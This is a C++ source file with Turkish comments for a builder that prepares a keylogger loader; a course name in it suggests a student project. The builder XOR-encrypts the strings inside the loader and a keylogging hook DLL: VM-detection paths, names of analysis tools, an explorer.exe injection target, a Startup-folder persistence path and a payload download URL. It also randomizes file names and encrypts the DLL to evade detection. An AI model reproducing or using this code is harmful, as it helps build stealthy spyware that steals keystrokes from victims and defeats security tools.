#include <windows.h>
#include <tchar.h>
#include <stdio.h>
#include <Strsafe.h>
#include "../loader/Katarlar.h"
#include "../loader/genel.h"
#include <locale.h>

// #define TABLO "XOXOXOXOXOXOXOXOXOXO"
// #define SIFRE_SIZE 6

TCHAR szLibname1_[] = TEXT("hooker.dll");//keylogging hook i�eren dll
TCHAR szLibname1[MAX_PATH] = TEXT("");
TCHAR szLibname2[MAX_PATH] = TEXT("");
TCHAR szSrcExename_[] = TEXT("loader.exe");
TCHAR szSrcExename[MAX_PATH] = TEXT("");
#ifdef _DEBUG
TCHAR szDscExename_[] = TEXT("loader.exe");
#else
TCHAR szDscExename_[] = TEXT("loaderNew.exe");
#endif
TCHAR szDscExename[MAX_PATH] = TEXT("");

// rasgele olarak �retece�imiz katarlar
TCHAR szInjDllName[] = INJ_DLL_NAME;
TCHAR szAutostartExeName[] = AUTOSTART_EXE_NAME;
TCHAR szNewLibName[] = DLL_DWNLD_FILENAME;
/******/
// �ifreli bir �ekilde durmas�n� istedi�imiz katarlar
PTCHAR szExeKatar[] = {
	WANTED_USERNAME,
	VMWARE_REG_PATH,
	VMWARE_REG_KEYVALUE,
	VMTOOLS_FOLDER,
	VBOX_FOLDER,
	INJ_TARGET_PROC_NAME,
	AUTOSTART_PATH_ENV_VAR,
	AUTOSTART_PATH_EK,
	INJ_DLL_PATH_ENV_VAR,
	DLL_DWNLD_URL,
	RUNTIME_LOAD_DLL
	// TEXT("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0"),
	// TEXT("C:\\Program Files\\VMware\\VMware Tools"),
	// TEXT("C:\\Program Files\\VBadds"),
	// TEXT("explorer.exe"),
	// TEXT("BGM532StudentFinal"),	
	// TEXT("ALLUSERSPROFILE"),
	// TEXT("Start Menu\\Programs\\Startup"),
	//SystemFolder + dllname olacak
	// TEXT("SystemRoot"),
	// TEXT("River Nevada.bmp"),
	//url + �zelWebFileName olacak
	//TEXT("http://ec2-54-187-198-168.us-west-2.compute.amazonaws.com/"),
	//TEXT("winver.exe"),
};

PCHAR szExeKatar2[]{
	RUNTIME_LOAD_FUNC2,
	RUNTIME_LOAD_FUNC3
};

// DLL i�in rasgele yap�lacak
TCHAR gszProcKatar[] = RANDOM_PROC_NAME;
/******/
PTSTR szLibKatar[] = {
	INJ_TARGET_PROC_NAME,
	HOOKDLL,
	PROCNAME01,
	PROCNAME02,
	PROCNAME03,
	PROCNAME04,
	PROCNAME05,
	PROCNAME06
	// TEXT("Kernel32.dll"),
	// L"ProcessHacker",
	// L"procexp",
	// L"Procmon",
	// L"Immunity",
	// L"OLLYDBG",
	// L"autoruns"
};

PSTR szLibKatar2[] = {
	HOOKFUNC
	// "CreateProcessW",
	// "explorer.exe"
};
/*****/
// dll ve exe deki katarlar�n �ifresi farkl� olacak
// dll in de �ifresi farkl� olacak
CHAR gszExeKatarSifre[] = KATAR_SIFRE;
CHAR gszDllKatarSifre[] = KATAR_SIFRE;
CHAR gszDllSifre[] = DLL_SIFRE;

// gerekli fonksiyonlar�m�z
PCHAR DosyaOku(PTSTR szFileName, PDWORD pdwFizeSize);
void XorEncode(PBYTE pbVeri, DWORD dwSize, PBYTE bSifre, DWORD dwSifreSize);
BOOL ChangeStr(PBYTE pbVeri, DWORD dwSize, PCHAR szOld, PCHAR szNew);
BOOL ChangeStrW(PBYTE pbVeri, DWORD dwSize, PTCHAR szOld, PTCHAR szNew);
BOOL DosyaYaz(PTSTR lpszFileName, LPVOID lpData, DWORD dwSize);
BOOL EncodeStr(PBYTE pbVeri, DWORD dwSize, PBYTE pbStr, DWORD dwStrLen, PBYTE pbSifre, DWORD dwSifreSize);
BOOL EncodeStr2(PBYTE pbVeri, DWORD dwSize, PBYTE pbStr1, PBYTE pbStr2, DWORD dwStrLen, PBYTE pbSifre, DWORD dwSifreSize);
void GetRandomCharSeq(PCHAR szData, DWORD dwSize);
void GetRandomWCharSeq(PWCHAR szData, DWORD dwLen);

void _tmain(int argc, TCHAR* argv[]) {
	setlocale(LC_ALL, "Turkish");
	//BYTE bXorByte = 0;	
	PVOID pExeFileVeri = NULL;
	PVOID pDllFileVeri = NULL;
	HANDLE hRsrc = NULL;

	//�al��t�r�ld��� PATH i bulma
	TCHAR szPath[MAX_PATH];
	GetModuleFileName(NULL, szPath, MAX_PATH);
	PTCHAR szProcessName = wcsrchr(szPath, L'\\') + 1;
	*szProcessName = 0;

	//kullan�lan dosyalar�n FULL path ini bul
	StringCbCopy(szLibname1, MAX_PATH, szPath);
	StringCbCat(szLibname1, MAX_PATH, szLibname1_);

	StringCbCopy(szLibname2, MAX_PATH, szPath);
	//StringCbCat(szLibname2, MAX_PATH, szLibname2_);

	StringCbCopy(szSrcExename, MAX_PATH, szPath);
	StringCbCat(szSrcExename, MAX_PATH, szSrcExename_);

	StringCbCopy(szDscExename, MAX_PATH, szPath);
	StringCbCat(szDscExename, MAX_PATH, szDscExename_);

	// random verilerimizi �retelim	
	PRINTF("Random verilerimizi �retelim...\n");
	srand((unsigned)GetTickCount());
	// sifreler
	GetRandomCharSeq(gszExeKatarSifre, strlen(gszExeKatarSifre));
	GetRandomCharSeq(gszDllKatarSifre, strlen(gszDllKatarSifre));
	GetRandomCharSeq(gszDllSifre, strlen(gszDllSifre));
	// isimler
	GetRandomWCharSeq(szInjDllName, lstrlen(szInjDllName) - 4); // sonundaki uzant�n�n korunmas� i�in
	GetRandomWCharSeq(szAutostartExeName, lstrlen(szAutostartExeName) - 4);
	// gszProcKatar
	GetRandomWCharSeq(gszProcKatar, lstrlen(gszProcKatar));
	// unique hedef dll ismini belirle
	GetRandomWCharSeq(szNewLibName, lstrlen(szNewLibName) - 4); // sonuna ".zip" oldu�u i�in
	StringCbCat(szLibname2, MAX_PATH, szNewLibName);

	// kaynak exe dosyas�n� oku
	PRINTF("Kaynak exe dosyas�n� oku...\n");
	DWORD dwSrcFileSize = 0;
	pExeFileVeri = DosyaOku(szSrcExename, &dwSrcFileSize);
	if (dwSrcFileSize == 0) {
		_tprintf(_T("Kaynak exe dosyadan (%s) okuma basarisiz oldu.\n"), szSrcExename);
		goto temizle;
	}

	PRINTF("Kaynak exe dosyas�ndaki katarlar� �ifrele ve de�i�tir...\n");
	for each (PTSTR szKatar in szExeKatar) {
		EncodeStr((PBYTE)pExeFileVeri, dwSrcFileSize, (PBYTE)szKatar, lstrlen(szKatar) * 2,
		          (PBYTE)gszExeKatarSifre, strlen(gszExeKatarSifre));
	}

	for each (PSTR szKatar in szExeKatar2) {
		EncodeStr((PBYTE)pExeFileVeri, dwSrcFileSize, (PBYTE)szKatar, strlen(szKatar),
		          (PBYTE)gszExeKatarSifre, strlen(gszExeKatarSifre));
	}

	PRINTF("Kaynak exe dosyas�ndaki katarlar�n �ifresini, dll a�ma �ifresini dosyaya yaz...\n");
	// katar �ifresini exe ye yaz
	ChangeStr((PBYTE)pExeFileVeri, dwSrcFileSize, KATAR_SIFRE, gszExeKatarSifre);

	// dll dosya a�ma �ifresini dosyaya yaz
	ChangeStr((PBYTE)pExeFileVeri, dwSrcFileSize, DLL_SIFRE, gszDllSifre);

	PRINTF("Kaynak exe dosyas�ndaki unique dll indirme ismini, y�klenecek �zel dll ismini, autostart exe sinin ismini �ifrele ve dosyaya yaz...\n");
	// �zel dll ismini yaz
	EncodeStr2((PBYTE)pExeFileVeri, dwSrcFileSize, (PBYTE)DLL_DWNLD_FILENAME, (PBYTE)szNewLibName,
	           lstrlen(DLL_DWNLD_FILENAME) * 2, (PBYTE)gszExeKatarSifre, strlen(gszExeKatarSifre));

	// di�er rasgele katar olup �ifreli bir �ekilde tutulacaklar
	EncodeStr2((PBYTE)pExeFileVeri, dwSrcFileSize, (PBYTE)INJ_DLL_NAME, (PBYTE)szInjDllName,
	           lstrlen(INJ_DLL_NAME) * 2, (PBYTE)gszExeKatarSifre, strlen(gszExeKatarSifre));

	// autostart da olacak exe nin ismi
	EncodeStr2((PBYTE)pExeFileVeri, dwSrcFileSize, (PBYTE)AUTOSTART_EXE_NAME, (PBYTE)szAutostartExeName,
	           lstrlen(AUTOSTART_EXE_NAME) * 2, (PBYTE)gszExeKatarSifre, strlen(gszExeKatarSifre));

	// yeni exeyi olu�tur
	PRINTF("Kaynak exe dosyas�ndaki de�i�tikliklerle yeni exe dosyas� olu�tur...\n");
	if (!DosyaYaz(szDscExename, pExeFileVeri, dwSrcFileSize)) {
		_tprintf(_T("Hedef exe dosya (%s) yazma basarisiz oldu.\n"), szDscExename);
		goto temizle;
	}

	// kaynak dll den verileri oku
	PRINTF("Kaynak dll dosyas�ndan verileri oku...\n");
	DWORD dwDllFileSize = 0;
	pDllFileVeri = DosyaOku(szLibname1, &dwDllFileSize);
	if (dwDllFileSize == 0) {
		_tprintf(_T("�lk kaynak dosyadan veri okuma basarisiz oldu: %s.\n"), szLibname1);
		goto temizle;
	}

	PRINTF("DLL ler katarlar�n� de�i�tir...\n");
	for each (PTSTR szKatar in szLibKatar) {
		EncodeStr((PBYTE)pDllFileVeri, dwDllFileSize, (PBYTE)szKatar, lstrlen(szKatar) * 2, (PBYTE)gszDllKatarSifre, strlen(gszDllKatarSifre));
	}

	//CHAR gszFuncName[] = "CreateProcessW"; sifrele ve de�i�tir
	for each (PSTR szKatar in szLibKatar2) {
		EncodeStr((PBYTE)pDllFileVeri, dwDllFileSize, (PBYTE)szKatar, strlen(szKatar), (PBYTE)gszDllKatarSifre, strlen(gszDllKatarSifre));
	}

	PRINTF("katar �ifresini  ve rasgele se�ilen proses ismini dll'e yaz...\n");
	//katar �ifresini dll e yaz
	ChangeStr((PBYTE)pDllFileVeri, dwDllFileSize, KATAR_SIFRE, gszDllKatarSifre);
	ChangeStrW((PBYTE)pDllFileVeri, dwDllFileSize, RANDOM_PROC_NAME, gszProcKatar);

	//dosyan�n kendisini �ifrele
	PRINTF("DLL dosyas�n�n kendisini �ifrele...\n");
	XorEncode((PBYTE)pDllFileVeri, dwDllFileSize, (PBYTE)gszDllSifre, strlen(gszDllSifre));

	PRINTF("Yeni DLL dosyas�n� olu�tur...\n");
	if (!DosyaYaz(szLibname2, pDllFileVeri, dwDllFileSize)) {
		_tprintf(_T("Hedef dll dosya (%s) yazma basarisiz oldu.\n"), szLibname2);
		goto temizle;
	}

	//XorEncode((LPBYTE)lpVeri1, dwSize1, (PBYTE)szTablo, strlen(szTablo) - 10);
	_tprintf(TEXT("%s "), szNewLibName);
	printf("%s %s %s ", gszExeKatarSifre, gszDllKatarSifre, gszDllSifre);
	_tprintf(TEXT("%s %s %s"), szInjDllName, szAutostartExeName, gszProcKatar);
	// printf("EXEKatarSifre: %s\tDLLKatarSifre: %s\tDLLDosyaSifre: %s\t", gszExeKatarSifre, gszDllKatarSifre, gszDllSifre);
	// _tprintf(TEXT("INJDLLName: %s\tAutostartExeName: %s\tProcName: %s\n"), szInjDllName, szAutostartExeName, gszProcKatar);
	// yeni lib name �nemli
	// _tprintf(TEXT("%s"), szNewLibName);

temizle:
	if (pDllFileVeri != NULL) free(pDllFileVeri);
	if (pExeFileVeri != NULL) free(pExeFileVeri);
	return;
}

PCHAR DosyaOku(PTSTR szFileName, PDWORD pdwFizeSize) {
	DWORD dwStatus = 0;
	BOOL bResult = FALSE;
	HANDLE hFile = NULL;
	DWORD cbRead = 0;
	LARGE_INTEGER fileSize;
	PCHAR veri = NULL;

	hFile = CreateFile(szFileName,
	                   GENERIC_READ,
	                   FILE_SHARE_READ,
	                   NULL,
	                   OPEN_EXISTING,
	                   FILE_FLAG_SEQUENTIAL_SCAN,
	                   NULL);

	if (INVALID_HANDLE_VALUE == hFile) {
		dwStatus = GetLastError();
		_tprintf(_T("Error opening file %s\nError: %d\n"), szFileName,
		         dwStatus);
		goto Temizle;
	}

	if (!GetFileSizeEx(hFile, &fileSize)) {
		dwStatus = GetLastError();
		_tprintf(_T("Error GetFileSizeEx %s\nError: %d\n"), szFileName, dwStatus);
		goto Temizle;
	}

	*pdwFizeSize = fileSize.LowPart;
	veri = (PCHAR)malloc(fileSize.LowPart);


	if (!ReadFile(hFile, veri, fileSize.LowPart, &cbRead, NULL)) {
		dwStatus = GetLastError();
		printf("ReadFile failed: %d\n", dwStatus);
		goto Temizle;
	}

Temizle:
	if (hFile != NULL)
		CloseHandle(hFile);

	return veri;
}

void XorEncode(PBYTE pbVeri, DWORD dwSize, PBYTE bSifre, DWORD dwSifreSize) {
	for (DWORD i = 0; i < dwSize; i++)
		if (pbVeri[i] != 0 && pbVeri[i] != bSifre[i % dwSifreSize])
			pbVeri[i] = pbVeri[i] ^ bSifre[i % dwSifreSize];
}

BOOL ChangeStr(PBYTE pbVeri, DWORD dwSize, PCHAR szOld, PCHAR szNew) {
	PCHAR szTempName = NULL;
	DWORD dwLen = strlen(szOld);

	if (dwLen > strlen(szNew)) {
		printf("ChangeStr HATA!: Eski katar yeni katardan daha uzun.\n");
		return FALSE;
	}

	for (DWORD i = 0; i < dwSize; i++) {
		for (DWORD m = 0; m < dwLen; m++) {
			if (*(pbVeri + i + m) != szOld[m]) break;
			else if (m == dwLen - 1) {
				szTempName = (PCHAR)(pbVeri + i);
				goto found;
			}
		}
	}

	printf("ChangeStr HATA!: Eski katar bulunamadi: %s.\n", szOld);
	return FALSE;

found:
	memcpy_s(szTempName, dwLen + 1, szNew, dwLen);

	return TRUE;
}

BOOL ChangeStrW(PBYTE pbVeri, DWORD dwSize, PTCHAR szOld, PTCHAR szNew) {
	PVOID szTempName = NULL;
	DWORD dwLen = lstrlen(szOld) * 2;

	if (dwLen > lstrlen(szNew) * 2) {
		printf("ChangeStrW HATA!: Eski katar yeni katardan daha uzun.\n");
		return FALSE;
	}

	for (DWORD i = 0; i < dwSize; i++) {
		for (DWORD m = 0; m < dwLen; m++) {
			if (*(pbVeri + i + m) != PBYTE(szOld)[m]) break;
			else if (m == dwLen - 1) {
				szTempName = (PBYTE(pbVeri) + i);
				goto found;
			}
		}
	}

	_tprintf(L"ChangeStrW HATA!: Eski katar bulunamadi: %s.\n", szOld);
	return FALSE;

found:

	memcpy_s(szTempName, dwLen + 1, szNew, dwLen);

	return TRUE;
}

BOOL DosyaYaz(PTSTR szFileName, LPVOID lpData, DWORD dwSize) {
	HANDLE hLibFile = NULL;
	BOOL bSuccess = FALSE;

	//yeni dosyay� olu�tur //FILE_ATTRIBUTE_SYSTEM biraz daha sakl� olmas� i�in
	hLibFile = CreateFile(szFileName, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hLibFile == INVALID_HANDLE_VALUE) {
		return FALSE;
	}

	DWORD dwWritten = 0;
	if (!WriteFile(hLibFile, lpData, dwSize, &dwWritten, NULL) || dwSize != dwWritten) {
		goto temizle;
	}

	bSuccess = TRUE;

temizle:
	if (hLibFile) CloseHandle(hLibFile);

	return bSuccess;
}

BOOL EncodeStr(PBYTE pbVeri, DWORD dwSize, PBYTE pbStr, DWORD dwStrLen, PBYTE pbSifre, DWORD dwSifreSize) {
	return EncodeStr2(pbVeri, dwSize, pbStr, pbStr, dwStrLen, pbSifre, dwSifreSize);
}

BOOL EncodeStr2(PBYTE pbVeri, DWORD dwSize, PBYTE pbStr1, PBYTE pbStr2, DWORD dwStrLen, PBYTE pbSifre, DWORD dwSifreSize) {
	PBYTE pFoundStrAdr = NULL;

	for (DWORD i = 0; i < dwSize; i++) {
		for (DWORD m = 0; m < dwStrLen; m++) {
			if (*(pbVeri + i + m) != pbStr1[m]) break;
			else if (m == dwStrLen - 1) {
				pFoundStrAdr = pbVeri + i;
				goto found;
			}
		}
	}

	_tprintf(L"EncodeStr HATA!: Eski katar bulunamadi: %s.\n", pbStr1);
	return FALSE;

found:
	PBYTE pTemp = (PBYTE)malloc(dwStrLen + 2);
	ZeroMemory(pTemp, dwStrLen + 2);
	memcpy_s(pTemp, dwStrLen, pbStr2, dwStrLen);

	XorEncode(pTemp, dwStrLen, pbSifre, dwSifreSize);
	memcpy_s(pFoundStrAdr, dwStrLen, pTemp, dwStrLen);

	// temizle
	free(pTemp);
	return TRUE;
}

void GetRandomCharSeq(PCHAR szData, DWORD dwSize) {
	const char myBasis_64[] =
		"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_";
	/* initialize random seed: */
	//srand((unsigned)time(NULL));
	DWORD dwLen = strlen(myBasis_64);

	for (DWORD i = 0; i < dwSize; i++) {
		szData[i] = myBasis_64[rand() % dwLen];
	}

	return;
}

void GetRandomWCharSeq(PWCHAR szData, DWORD dwLen) {
	const WCHAR myBasis_64[] =
		L"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_";
	/* initialize random seed: */
	//srand((unsigned)time(NULL));
	DWORD dwBasisLen = lstrlenW(myBasis_64);

	for (DWORD i = 0; i < dwLen; i++) {
		szData[i] = myBasis_64[rand() % dwBasisLen];
	}

	return;
}
